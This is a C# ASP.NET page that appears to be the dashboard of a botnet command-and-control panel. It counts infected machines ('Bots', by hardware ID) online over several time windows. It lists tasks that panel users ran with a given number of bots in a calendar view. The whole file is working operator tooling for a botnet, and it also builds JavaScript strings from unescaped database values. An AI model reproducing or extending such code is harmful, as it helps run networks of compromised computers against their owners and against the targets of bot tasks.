using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SqlClient;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

public partial class Calander : System.Web.UI.Page
{
    public string kleurSyntax;
    public string procentSyntax;
    public string CalenderSyn = "";

    public void Page_Load(object sender, EventArgs e)
    {
        if ((Session["Check"] == null) || (Convert.ToBoolean(Session["Check"]) == false))
        {
            Response.Redirect("Login.aspx");
        }

        using (SqlConnection conn = new SqlConnection(Settings.sqlConn))
        {
            conn.Open();
            int onnlineNow;
            int connToday;
            int connWeek;
            int connMonth;
            int connTotal;
            int Amount;
            int Calender;

            double connTodayPre;
            double connWeekPre;
            double connMonthPre;
            double connNowPre;

            using (SqlCommand cmd = new SqlCommand("SELECT count(distinct HWID) FROM Bots;", conn))
            {
                connTotal = (int)cmd.ExecuteScalar();
                lblConnectionsTotal.Text = connTotal.ToString();
                lblTotalBots.Text = connTotal.ToString();
            }

            using (SqlCommand cmd = new SqlCommand("SELECT count(distinct HWID) FROM Bots WHERE (LastConn <= convert(datetime,GETDATE())) AND (LastConn >= convert(datetime,DATEADD(second, -6 , GETDATE())));", conn))
            {
                onnlineNow = (int)cmd.ExecuteScalar();
                lblOnnlineNow.Text = onnlineNow.ToString();
                connNowPre = Math.Round((double)(100 * onnlineNow) / connTotal, 1);
                onlineNowPrec.Text = "data-percent=\"" + connNowPre + "\"";
            }

            using (SqlCommand cmd = new SqlCommand("SELECT count(distinct HWID) FROM Bots WHERE (LastConn <= convert(datetime,GETDATE())) AND (LastConn >= convert(datetime,DATEADD(day, -1, GETDATE())));", conn))
            {
                connToday = (int)cmd.ExecuteScalar();
                lblConnectionsToday.Text = connToday.ToString();
                connTodayPre = Math.Round((double)(100 * connToday) / connTotal, 1);
                connTodayPrec.Text = "data-percent=\"" + connTodayPre + "\"";
            }

            using (SqlCommand cmd = new SqlCommand("SELECT count(distinct HWID) FROM Bots WHERE (LastConn <= convert(datetime,GETDATE())) AND (LastConn >= convert(datetime,DATEADD(day, -7, GETDATE())));", conn))
            {
                connWeek = (int)cmd.ExecuteScalar();
                lblConnectionsWeek.Text = connWeek.ToString();
                connWeekPre = Math.Round((double)(100 * connWeek) / connTotal, 1);
                connWeekPrec.Text = "data-percent=\"" + connWeekPre + "\"";
            }

            using (SqlCommand cmd = new SqlCommand("SELECT count(distinct HWID) FROM Bots WHERE (LastConn <= convert(datetime,GETDATE())) AND (LastConn >= convert(datetime,DATEADD(day, -30, GETDATE())));", conn))
            {
                connMonth = (int)cmd.ExecuteScalar();
                lblConnectionsMonth.Text = connMonth.ToString();
                connMonthPre = Math.Round((double)(100 * connMonth) / connTotal, 1);
                connMonthPrec.Text = "data-percent=\"" + connMonthPre + "\"";
            }

            using (SqlCommand cmd = new SqlCommand("SELECT Count(*) from Tasks",conn))
            {
                Amount = (int)cmd.ExecuteScalar();
            }

            for (int i = 1;i<=Amount;i++)
            {
                int TaskID = 0;
                using (SqlCommand cmd = new SqlCommand("SELECT TaskID FROM (SELECT TaskID,DENSE_RANK() OVER (ORDER BY TaskID) AS rownum FROM Tasks)AS tbl WHERE tbl.rownum = @i", conn))
                {
                    cmd.Parameters.AddWithValue("i",i);
                    TaskID = (int)cmd.ExecuteScalar();
                    cmd.Parameters.Clear();
                }

                using (SqlCommand cmd = new SqlCommand("UPDATE Calender SET ending = @ending Where TaskID = @TaskID", conn))
                {
                    cmd.Parameters.AddWithValue("TaskID",TaskID);
                    cmd.Parameters.AddWithValue("ending", Settings.getDate());
                    cmd.ExecuteNonQuery();
                    cmd.Parameters.Clear();
                }
            }

            using (SqlCommand cmd = new SqlCommand("SELECT count(*) from Calender",conn))
            {
                Calender = (int)cmd.ExecuteScalar();
            }

            for (int i = 1;Calender>=i;i++)
            {
                int TaskID = 0;
                int UserID = 0;
                string Type = "";
                string par1 = "";
                string par2 = "";
                string par3 = "";
                string par4 = "";
                string name = "";
                int max;

                DateTime start;
                DateTime end;
                DateTime time10 = Settings.getDate();
                time10 = time10.AddSeconds(-10);

                using (SqlCommand cmd = new SqlCommand("SELECT TaskID FROM(SELECT TaskID,DENSE_RANK() OVER (ORDER BY taskid) AS rownum FROM calender)AS tbl WHERE tbl.rownum = @i", conn))
                {
                    cmd.Parameters.AddWithValue("i", i);
                    TaskID = (int)cmd.ExecuteScalar();
                    cmd.Parameters.Clear();
                }

                using (SqlCommand cmd = new SqlCommand("SELECT UserID FROM Calender WHERE TaskID = @TaskID",conn))
                {
                    cmd.Parameters.AddWithValue("TaskID",TaskID);
                    UserID = (int)cmd.ExecuteScalar();
                    cmd.Parameters.Clear();
                }

                using (SqlCommand cmd = new SqlCommand("SELECT Type FROM Calender WHERE TaskID = @TaskID",conn))
                {
                    cmd.Parameters.AddWithValue("TaskID",TaskID);
                    Type = (string)cmd.ExecuteScalar();
                    cmd.Parameters.Clear();
                }

                using (SqlCommand cmd = new SqlCommand("SELECT Parameter1 FROM Calender WHERE TaskID = @TaskID", conn))
                {
                    cmd.Parameters.AddWithValue("TaskID", TaskID);
                    par1 = (string)cmd.ExecuteScalar();
                    cmd.Parameters.Clear();
                }

                using (SqlCommand cmd = new SqlCommand("SELECT Parameter2 FROM Calender WHERE TaskID = @TaskID", conn))
                {
                    cmd.Parameters.AddWithValue("TaskID", TaskID);
                    par2 = (string)cmd.ExecuteScalar();
                    cmd.Parameters.Clear();
                }
                using (SqlCommand cmd = new SqlCommand("SELECT Parameter3 FROM Calender WHERE TaskID = @TaskID", conn))
                {
                    cmd.Parameters.AddWithValue("TaskID", TaskID);
                    par3 = (string)cmd.ExecuteScalar();
                    cmd.Parameters.Clear();
                }

                using (SqlCommand cmd = new SqlCommand("SELECT Parameter4 FROM Calender WHERE TaskID = @TaskID", conn))
                {
                    cmd.Parameters.AddWithValue("TaskID", TaskID);
                    par4 = (string)cmd.ExecuteScalar();
                    cmd.Parameters.Clear();
                }

                using (SqlCommand cmd = new SqlCommand("SELECT Max FROM Calender WHERE TaskID = @TaskID", conn))
                {
                    cmd.Parameters.AddWithValue("TaskID", TaskID);
                    max = (int)cmd.ExecuteScalar();
                    cmd.Parameters.Clear();
                }

                using (SqlCommand cmd = new SqlCommand("SELECT start FROM Calender WHERE TaskID = @TaskID", conn))
                {
                    cmd.Parameters.AddWithValue("TaskID", TaskID);
                    start = (DateTime)cmd.ExecuteScalar();
                    cmd.Parameters.Clear();
                }

                using (SqlCommand cmd = new SqlCommand("SELECT Ending FROM Calender WHERE TaskID = @TaskID", conn))
                {
                    cmd.Parameters.AddWithValue("TaskID", TaskID);
                    end = (DateTime)cmd.ExecuteScalar();
                    cmd.Parameters.Clear();
                }

                using (SqlCommand cmd = new SqlCommand("Select Username from users where UserID = @UserID", conn))
                {
                    cmd.Parameters.AddWithValue("UserID", UserID);
                    name = (string)cmd.ExecuteScalar();
                    cmd.Parameters.Clear();
                }

                if (end > time10 && end < Settings.getDate())
                {
                    CalenderSyn += "{title:'" + name + " used " + Type + " with " + max + " bot(\\'s) and they\\'re still online',start:'" + start + "',end:'" + end + "'},";
                }
                else
                {
                    CalenderSyn += "{title:'" + name + " used " + Type + " with " + max + " bot(\\'s)',start:'" + start + "',end:'" + end + "'},";
                }
            }
        }
    }
}
